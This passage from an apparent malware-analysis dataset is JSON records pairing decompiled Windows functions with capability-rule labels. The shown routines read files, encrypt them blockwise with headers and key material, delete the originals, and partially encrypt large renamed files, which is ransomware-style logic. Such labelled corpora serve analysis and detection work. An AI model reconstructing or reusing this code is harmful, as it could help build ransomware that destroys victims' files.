**(in_EAX + 0x14) = iVar3;\n    *(in_EAX + 0x18) = 1;\n    fcn.00407928();\n    do {\n        iVar3 = fcn.004080a8(var_4h);\n        if (iVar3 == 0) {\n            if (*(iVar1 + 8) != 0x7fff55aa) {\n                *(iVar1 + 8) = *(iVar1 + 8) + 1;\n            }\n            uVar2 = fcn.00407efa(in_EAX, iVar1, iVar1);\n            iVar1 = fcn.00407b16(in_EAX, uVar2, *(in_EAX + 0xc + *(in_EAX + 0x24) * 4));\n        }\n        else {\n            var_8h = 0;\n            iVar3 = var_4h;\n            if (var_4h < 0) {\n                var_4h = 0;\n            }\n            else {\n                while (iVar4 = fcn.004080a8(var_4h),  iVar4 == 0) {\n                    var_4h = var_4h + 1;\n                }\n            }\n            for (; var_4h <= iVar3; iVar3 = iVar3 + -1) {\n                if (*(iVar1 + 8) != 0x7fff55aa) {\n                    *(iVar1 + 8) = *(iVar1 + 8) + 1;\n                }\n                uVar2 = fcn.00407efa(in_EAX, iVar1, iVar1);\n                iVar1 = fcn.00407b16(in_EAX, uVar2, *(in_EAX + 0xc + *(in_EAX + 0x24) * 4));\n                iVar4 = fcn.004080a8(iVar3);\n                if (iVar4 != 0) {\n                    var_8h = var_8h + 1;\n                }\n                if (iVar3 != var_4h) {\n                    var_8h = var_8h << 1;\n                }\n            }\n            uVar2 = fcn.00407efa(in_EAX, iVar1, *(*(in_EAX + 0x14) + ((var_8h + -1) / 2) * 4));\n            iVar1 = fcn.00407b16(in_EAX, uVar2, *(in_EAX + 0xc + *(in_EAX + 0x24) * 4));\n        }\n        var_4h = var_4h + -1;\n    } while (-1 < var_4h);\n    var_4h = 0;\n    if (0 < *(in_EAX + 0x18)) {\n        do {\n            fcn.0040793b();\n            fcn.00407951();\n            var_4h = var_4h + 1;\n        } while (var_4h < *(in_EAX + 0x18));\n    }\n    fcn.004090a1(*(in_EAX + 0x14));\n    fcn.00407951();\n    fcn.00407951();\n    return iVar1;\n}\n",
        "token_count": 1068
    },
    "004085d9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004085d9(uint8_t *param_1, int32_t param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = ~in_EAX;\n    for (; param_2 != 0; param_2 = param_2 + -1) {\n        uVar1 = uVar1 >> 8 ^ *(((*param_1 ^ uVar1) & 0xff) * 4 + 0x40b000);\n        param_1 = param_1 + 1;\n    }\n    return ~uVar1;\n}\n",
        "token_count": 139
    },
    "00408782": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408782(uint arg_8h, uint lpFileName, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_288h;\n    uint var_160h;\n    int32_t var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint32_t lpNumberOfBytesWritten;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint32_t liDistanceToMove;\n    uint32_t lpNewFilePointer;\n    uint32_t nNumberOfBytesToRead;\n    uint32_t nNumberOfBytesToWrite;\n    int32_t hFile;\n    int32_t var_4h;\n    \n    var_20h = 0;\n    nNumberOfBytesToRead = in_EAX[9] - (in_EAX[9] & 0xfU);\n    var_30h = fcn.00408601(lpFileName);\n    iVar3 = fcn.004090c6(var_30h);\n    puVar1 = in_EAX[8];\n    var_2ch = puVar1 + 8;\n    var_34h = iVar3 * 2 + 2;\n    if ((var_2ch + (var_34h - puVar1) & 0xfU) == 0) {\n        iVar3 = -puVar1;\n    }\n    else {\n        iVar3 = (-puVar1 - (var_2ch + (var_34h - puVar1) & 0xfU)) + 0x10;\n    }\n    var_24h = var_2ch + var_34h + iVar3;\n    iVar3 = puVar1 + var_24h;\n    var_1ch = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(lpFileName);\n    var_4h = -1;\n    if ((((iVar3 - in_EAX[8]) + 0xb2U <= nNumberOfBytesToRead) &&\n        (iVar4 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(arg_10h),  iVar4 == -1)) &&\n       (hFile = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0xc0000000, 0, 0, 3, 0, 0),  hFile != -1)) {\n        lpNewFilePointer = 0;\n        liDistanceToMove = 0;\n        iVar4 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, 0, 0, &liDistanceToMove, 2);\n        if ((iVar4 != 0) && ((liDistanceToMove | lpNewFilePointer) != 0)) {\n            liDistanceToMove = 0;\n            lpNewFilePointer = 0;\n            iVar4 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, 0, 0, &liDistanceToMove, 0);\n            if ((iVar4 != 0) &&\n               ((var_4h = (*_sym.imp.KERNEL32.dll_CreateFileW)(arg_10h, 0x40000000, 1, 0, 1, var_1ch, 0),  var_4h != -1\n                && (iVar4 = fcn.0040669b(&var_288h, *in_EAX, arg_8h),  iVar4 == 0)))) {\n                do {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                      (hFile, in_EAX[8], nNumberOfBytesToRead, &nNumberOfBytesToWrite, 0);\n                    if (iVar4 == 0) goto code_r0x00408aa3;\n                    if (nNumberOfBytesToWrite < nNumberOfBytesToRead) {\n                        var_1ch = 0x10 - (nNumberOfBytesToWrite & 0xf);\n                        fcn.00408fa9(in_EAX[8] + nNumberOfBytesToWrite, 0, var_1ch);\n                        nNumberOfBytesToWrite = nNumberOfBytesToWrite + var_1ch;\n                    }\n                    iVar4 = fcn.00406432(&var_288h, in_EAX[8], in_EAX[8]);\n                    if (((iVar4 == 0) ||\n                        (iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                           (var_4h, in_EAX[8], nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0), \n                        iVar4 == 0)) || (lpNumberOfBytesWritten != nNumberOfBytesToWrite)) goto code_r0x00408aa3;\n                } while (nNumberOfBytesToRead <= nNumberOfBytesToWrite);\n                *puVar1 = 0;\n                puVar1[1] = 2;\n                puVar1[2] = 0xf0a75e12;\n                puVar1[6] = 0x20;\n                fcn.00408fd7(var_2ch, var_30h, var_34h);\n                fcn.00408fd7(iVar3, in_EAX + 1, 0x14);\n                fcn.00408fd7(iVar3 + 0x14, arg_8h, 0x10);\n                fcn.00408fd7(iVar3 + 0x28, *in_EAX + 0x20, 0x80);\n                fcn.00408fd7(iVar3 + 0xac, in_EAX + 6, 6);\n                *(iVar3 + 0x24) = var_1ch;\n                *(iVar3 + 0xa8) = var_24h + 0xb2;\n                iVar4 = fcn.0040669b(&var_160h, *in_EAX, arg_8h);\n                if ((iVar4 == 0) && (iVar4 = fcn.00406432(&var_160h, in_EAX[8], in_EAX[8]),  iVar4 != 0)) {\n                    fcn.00408fa9(&var_160h, 0, 0x128);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                      (var_4h, in_EAX[8], *(iVar3 + 0xa8), &lpNumberOfBytesWritten, 0);\n                    if ((iVar4 != 0) && (lpNumberOfBytesWritten == *(iVar3 + 0xa8))) {\n                        if ((arg_14h & 4) != 0) {\n                            fcn.004086b7(hFile);\n                        }\n                        pcVar2 = _sym.imp.KERNEL32.dll_FlushFileBuffers;\n                        if ((arg_14h & 2) != 0) {\n                            (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(hFile);\n                            (*pcVar2)(var_4h);\n                        }\n                        var_20h = 1;\n                    }\n                }\ncode_r0x00408aa3:\n                fcn.00408fa9(&var_288h, 0, 0x128);\n            }\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hFile);\n        if (var_4h != -1) {\n            (*pcVar2)(var_4h);\n        }\n        if ((var_20h != 0) || (lpFileName = arg_10h,  var_4h != -1)) {\n            (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n        }\n    }\n    return var_20h;\n}\n",
        "token_count": 1717
    },
    "00408b60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00408b60(uint hFile, int32_t arg_ch, int32_t lpBuffer)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    int64_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t dwMoveMethod;\n    int32_t var_10h;\n    int32_t lpNumberOfBytesRead;\n    \n    bVar6 = false;\n    dwMoveMethod = 0;\n    var_10h = 0;\n    iVar4 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, 0, 0, &dwMoveMethod, 2);\n    iVar3 = var_10h;\n    uVar2 = dwMoveMethod;\n    if ((iVar4 != 0) && ((var_10h != 0 || (0xbffff < dwMoveMethod)))) {\n        iVar7 = fcn.00409530(dwMoveMethod, var_10h, 3, 0);\n        iVar1 = 0;\n        uVar5 = 0;\n        while( true ) {\n            if (uVar5 == 2) {\n                iVar1 = CONCAT44(iVar3 + -1 + (0x3ffff < uVar2), uVar2 - 0x40000);\n            }\n            *(arg_ch + uVar5 * 8) = iVar1;\n            *(arg_ch + 4 + uVar5 * 8) = iVar1 >> 0x20;\n            _dwMoveMethod = iVar1;\n            iVar4 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, iVar1, &dwMoveMethod, 0);\n            if ((iVar4 == 0) || (iVar1 != _dwMoveMethod)) break;\n            iVar4 = (*_sym.imp.KERNEL32.dll_ReadFile)(hFile, lpBuffer, 0x40000, &lpNumberOfBytesRead, 0);\n            if ((iVar4 == 0) || (lpNumberOfBytesRead != 0x40000)) break;\n            iVar1 = iVar7 + iVar1;\n            lpBuffer = lpBuffer + 0x40000;\n            uVar5 = uVar5 + 1;\n            if (2 < uVar5) break;\n        }\n        bVar6 = uVar5 == 3;\n    }\n    return bVar6;\n}\n",
        "token_count": 560
    },
    "00408c42": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408c42(uint arg_8h, uint lpExistingFileName, uint lpNewFileName, uint32_t arg_14h)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_158h;\n    uint *var_30h;\n    uint var_2ch;\n    int32_t lpNumberOfBytesWritten;\n    int32_t var_24h;\n    uint liDistanceToMove;\n    uint lpNewFilePointer;\n    uint *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t hObject;\n    \n    var_8h = 0;\n    var_2ch = fcn.00408601(lpExistingFileName);\n    iVar2 = fcn.004090c6(var_2ch);\n    puVar1 = in_EAX[8];\n    var_14h = puVar1 + 0xe;\n    var_30h = puVar1 + 0x3000e;\n    var_24h = iVar2 * 2 + 2;\n    if ((var_30h + (var_24h - puVar1) & 0xfU) == 0) {\n        iVar2 = -puVar1;\n    }\n    else {\n        iVar2 = (-puVar1 - (var_30h + (var_24h - puVar1) & 0xfU)) + 0x10;\n    }\n    var_10h = var_30h + var_24h + iVar2;\n    iVar2 = puVar1 + var_10h;\n    var_ch = iVar2 + 0xb2;\n    if ((((var_ch - puVar1) + 0x40018U <= in_EAX[9]) &&\n        (iVar3 = (*_sym.imp.KERNEL32.dll_MoveFileW)(lpExistingFileName, lpNewFileName),  iVar3 != 0)) &&\n       (hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpNewFileName, 0xc0000000, 0, 0, 3, 0, 0),  hObject != -1)) {\n        iVar3 = fcn.00408b60(hObject, puVar1 + 8, var_14h);\n        if (iVar3 != 0) {\n            fcn.00408fd7(var_ch, puVar1 + 8, 0x18);\n            *puVar1 = 0;\n            puVar1[1] = 1;\n            puVar1[2] = 0xaf77bc0f;\n            puVar1[3] = 3;\n            puVar1[4] = 0x40000;\n            uVar4 = fcn.004085d9(0xc0000);\n            puVar1[5] = uVar4;\n            puVar1[6] = 0xc0038;\n            fcn.00408fd7(var_30h, var_2ch, var_24h);\n            iVar5 = fcn.0040669b(&var_158h, *in_EAX, arg_8h);\n            iVar3 = var_10h;\n            if ((iVar5 == 0) && (iVar5 = fcn.00406432(&var_158h, in_EAX[8], in_EAX[8]),  iVar5 != 0)) {\n                fcn.00408fa9(&var_158h, 0, 0x128);\n                fcn.00408fd7(iVar2, in_EAX + 1, 0x14);\n                fcn.00408fd7(iVar2 + 0x14, arg_8h, 0x10);\n                fcn.00408fd7(iVar2 + 0x28, *in_EAX + 0x20, 0x80);\n                fcn.00408fd7(iVar2 + 0xac, in_EAX + 6, 6);\n                iVar5 = hObject;\n                *(iVar2 + 0x24) = 0;\n                *(iVar2 + 0xa8) = iVar3 + 0xb2;\n                liDistanceToMove = 0;\n                lpNewFilePointer = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hObject, 0, 0, &liDistanceToMove, 2);\n                if ((iVar3 != 0) &&\n                   ((iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                       (iVar5, in_EAX[8], *(iVar2 + 0xa8), &lpNumberOfBytesWritten, 0),  iVar3 != 0 &&\n                    (lpNumberOfBytesWritten == *(iVar2 + 0xa8))))) {\n                    (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar5);\n                    fcn.00408af1(iVar5, var_ch + 0x18);\n                    if ((arg_14h & 2) != 0) {\n                        (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(iVar5);\n                    }\n                    var_8h = 1;\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        if (var_8h != 0) {\n            return var_8h;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_MoveFileW)(lpNewFileName, lpExistingFileName);\n    return var_8h;\n}\n",
        "token_count": 1231
    },
    "00408ebe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408ebe(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_EDI;\n    uint32_t lpFileSize;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)();\n    if (iVar2 == -1) {\n        return var_4h;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(iVar2, &lpFileSize);\n    if (iVar3 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        iVar2 = -1;\n        var_18h = lpFileSize;\n        var_14h = var_1ch;\n        if ((lpFileSize | var_1ch) == 0) {\n            return var_4h;\n        }\n        var_ch = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)();\n        pcVar1 = _sym.imp.KERNEL32.dll_SetFileAttributesW;\n        if (var_ch == 0xffffffff) {\n            return var_4h;\n        }\n        var_8h = var_ch & 1;\n        if (var_8h != 0) {\n            (*_sym.imp.KERNEL32.dll_SetFileAttributesW)();\n        }\n        if (((arg_14h & 1) == 0) && ((var_14h != 0 || (0x17ffff < var_18h)))) {\n            var_4h = fcn.00408c42(arg_ch, unaff_EDI, arg_10h, arg_14h);\n        }\n        else {\n            var_4h = fcn.00408782(arg_ch, unaff_EDI, arg_10h, arg_14h);\n        }\n        if (var_8h == 0) {\n            return var_4h;\n        }\n        if (var_4h != 0) {\n            (*pcVar1)(arg_10h, var_ch);\n            return var_4h;\n        }\n        (*pcVar1)();\n    }\n    if (iVar2 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return var_4h;\n}\n",
        "token_count": 568
    },
    "00408fd7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408fd7(int32_t arg_8h, uchar *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_10h != 0) {\n        iVar1 = arg_8h - arg_ch;\n        do {\n            arg_10h = arg_10h + -1;\n            arg_ch[iVar1] = *arg_ch;\n            arg_ch = arg_ch + 1;\n        } while (arg_10h != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 127
    },
    "0040907a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040907a(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        param_2 = 1;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1, param_2);\n    (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar1);\n    return;\n}\n",
        "token_count": 99
    },
    "00409163": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint16_t * fcn.00409163(int16_t *param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    \n    if (*param_2 != 0) {\n        iVar1 = *param_1;\n        if (iVar1 != 0) {\n            iVar3 = param_1 - param_2;\n            piVar2 = param_2;\njoined_r0x00409188:\n            do {\n                if (iVar1 != 0) {\n                    if (*piVar2 == 0) {\n                        return param_1;\n                    }\n                    if (*(iVar3 + piVar2) == *piVar2) {\n                        iVar1 = *(iVar3 + piVar2 + 1);\n                        piVar2 = piVar2 + 1;\n                        goto joined_r0x00409188;\n                    }\n                }\n                if (*piVar2 == 0) {\n                    return param_1;\n                }\n                param_1 = param_1 + 1;\n                iVar1 = *param_1;\n                iVar3 = iVar3 + 2;\n                piVar2 = param_2;\n            } while (iVar1 != 0);\n        }\n        param_1 = NULL;\n    }\n    return param_1;\n}\n",
        "token_count": 288
    },
    "004091c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.004091c0(char *arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    \n    if (*arg_ch != '\\0') {\n        cVar1 = *arg_8h;\n        if (cVar1 != '\\0') {\n            iVar3 = arg_8h - arg_ch;\n            pcVar2 = arg_ch;\njoined_r0x004091df:\n            do {\n                if (cVar1 != '\\0') {\n                    if (*pcVar2 == '\\0') {\n                        return arg_8h;\n                    }\n                    if (pcVar2[iVar3] == *pcVar2) {\n                        cVar1 = (pcVar2 + 1)[iVar3];\n                        pcVar2 = pcVar2 + 1;\n                        goto joined_r0x004091df;\n                    }\n                }\n                if (*pcVar2 == '\\0') {\n                    return arg_8h;\n                }\n                arg_8h = arg_8h + 1;\n                cVar1 = *arg_8h;\n                iVar3 = iVar3 + 1;\n                pcVar2 = arg_ch;\n            } while (cVar1 != '\\0');\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 292
    },
    "00409216": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409216(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        for (; ((arg_10h = arg_10h + -1,  arg_10h != 0 && (*arg_8h != 0)) && (*arg_8h == *arg_ch)); arg_8h = arg_8h + 1)\n        {\n            arg_ch = arg_ch + 1;\n        }\n        return *arg_8h - *arg_ch;\n    }\n    return 0;\n}\n",
        "token_count": 142
    },
    "0040924d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040924d(char *arg_8h, char *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        for (; ((arg_10h = arg_10h + -1,  arg_10h != 0 && (*arg_8h != '\\0')) && (*arg_8h == *arg_ch));\n            arg_8h = arg_8h + 1) {\n            arg_ch = arg_ch + 1;\n        }\n        return *arg_8h - *arg_ch;\n    }\n    return 0;\n}\n",
        "token_count": 139
    },
    "004092b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004092b4(int16_t *param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *param_1;\n    while (iVar1 != 0) {\n        param_1 = param_1 + 1;\n        iVar1 = *param_1;\n    }\n    iVar2 = param_1 - param_2;\n    do {\n        iVar1 = *param_2;\n        *(iVar2 + param_2) = iVar1;\n        param_2 = param_2 + 1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 146
    },
    "00409344": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00409344(uint16_t **arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint16_t *unaff_EBX;\n    uint16_t *puVar5;\n    uint32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        *arg_8h = unaff_EBX;\n    }\n    var_4h = 0;\n    uVar1 = *unaff_EBX;\n    puVar5 = unaff_EBX + 1;\n    while (uVar4 = uVar1,  uVar4 == 0x20) {\n        uVar1 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    if (uVar1 == 0x2d) {\n        arg_10h = arg_10h | 2;\ncode_r0x0040937b:\n        uVar4 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    else if (uVar1 == 0x2b) goto code_r0x0040937b;\n    if (((arg_ch < 0) || (arg_ch == 1)) || (0x24 < arg_ch)) {\n        if (arg_8h != NULL) {\n            *arg_8h = unaff_EBX;\n        }\n        return 0;\n    }\n    if (arg_ch == 0) {\n        if (uVar4 != 0x30) {\n            arg_ch = 10;\n            goto code_r0x004093ef;\n        }\n        if ((*puVar5 != 0x78) && (*puVar5 != 0x58)) {\n            arg_ch = 8;\n            goto code_r0x004093ef;\n        }\n        arg_ch = 0x10;\n    }\n    else if ((arg_ch != 0x10) || (uVar4 != 0x30)) goto code_r0x004093ef;\n    if ((*puVar5 == 0x78) || (*puVar5 == 0x58)) {\n        uVar4 = puVar5[1];\n        puVar5 = puVar5 + 2;\n    }\ncode_r0x004093ef:\n    uVar3 = 0xffffffff / arg_ch;\n    do {\n        iVar2 = uVar4;\n        if (iVar2 - 0x30U < 10) {\n            uVar4 = uVar4 - 0x30;\n        }\n        else if (iVar2 - 0x41U < 6) {\n            uVar4 = uVar4 - 0x37;\n        }\n        else {\n            if (5 < iVar2 - 0x61U) {\ncode_r0x00409449:\n                puVar5 = puVar5 + -1;\n                if ((arg_10h & 8) == 0) {\n                    if (arg_8h != NULL) {\n                        puVar5 = unaff_EBX;\n                    }\n                    var_4h = 0;\n                }\n                else if (((arg_10h & 4) != 0) ||\n                        (((arg_10h & 1) == 0 &&\n                         ((((arg_10h & 2) != 0 && (0x80000000 < var_4h)) ||\n                          (((arg_10h & 2) == 0 && (0x7fffffff < var_4h)))))))) {\n                    if ((arg_10h & 1) == 0) {\n                        var_4h = ((arg_10h & 2) != 0) + 0x7fffffff;\n                    }\n                    else {\n                        var_4h = 0xffffffff;\n                    }\n                }\n                if (arg_8h != NULL) {\n                    *arg_8h = puVar5;\n                }\n                if ((arg_10h & 2) == 0) {\n                    return var_4h;\n                }\n                return -var_4h;\n            }\n            uVar4 = uVar4 - 0x57;\n        }\n        if (arg_ch <= uVar4) goto code_r0x00409449;\n        if ((var_4h < uVar3) || ((var_4h == uVar3 && (uVar4 <= 0xffffffff % arg_ch)))) {\n            var_4h = var_4h * arg_ch + uVar4;\n            arg_10h = arg_10h | 8;\n        }\n        else {\n            arg_10h = arg_10h | 0xc;\n            if (arg_8h == NULL) goto code_r0x00409449;\n        }\n        uVar4 = *puVar5;\n        puVar5 = puVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 1083
    },
    "0040271b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040271b(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpNumberOfBytesRead;\n    int32_t hObject;\n    int32_t lpWideCharStr;\n    int32_t lpMultiByteStr;\n    \n    var_1ch = 0;\n    lpNumberOfBytesRead = 0;\n    lpMultiByteStr = 0;\n    lpWideCharStr = 0;\n    iVar2 = fcn.00409041(0x20a);\n    arg_8h_00 = fcn.00409041(0x20a);\n    if (arg_8h_00 != 0) {\n        if (iVar2 == 0) goto code_r0x00402844;\n        iVar3 = fcn.00405b20(iVar2);\n        if (iVar3 != 0) {\n            iVar3 = fcn.004059f1(arg_8h_00, 0x104, 3);\n            if (iVar3 != 0) {\n                hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(arg_8h_00, 0x80000000, 0, 0, 3, 0, 0);\n                pcVar1 = _sym.imp.KERNEL32.dll_SetFilePointer;\n                if (hObject != -1) {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(hObject, 0, 0, 2);\n                    lpMultiByteStr = fcn.00409041(iVar3);\n                    lpWideCharStr = fcn.00409041(iVar3 * 2 + 2);\n                    if ((lpMultiByteStr != 0) && (lpWideCharStr != 0)) {\n                        iVar4 = (*pcVar1)(hObject, 0, 0, 0);\n                        if (iVar4 == 0) {\n                            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                              (hObject, lpMultiByteStr, iVar3, &lpNumberOfBytesRead, 0);\n                            iVar4 = lpWideCharStr;\n                            if ((iVar5 != 0) && (lpNumberOfBytesRead == iVar3)) {\n                                iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                                  (0xfde9, 0, lpMultiByteStr, iVar3, lpWideCharStr, iVar3);\n                                *(iVar4 + iVar3 * 2) = 0;\n                                var_1ch = fcn.00402504(iVar4, arg_ch);\n                            }\n                        }\n                    }\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n                }\n            }\n        }\n    }\n    if (iVar2 != 0) {\n        fcn.004090a1(iVar2);\n    }\ncode_r0x00402844:\n    if (arg_8h_00 != 0) {\n        fcn.004090a1(arg_8h_00);\n    }\n    if (lpMultiByteStr != 0) {\n        fcn.004090a1(lpMultiByteStr);\n    }\n    if (lpWideCharStr != 0) {\n        fcn.004090a1(lpWideCharStr);\n    }\n    return var_1ch;\n}\n",
        "token_count": 776
    },
    "004029f5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
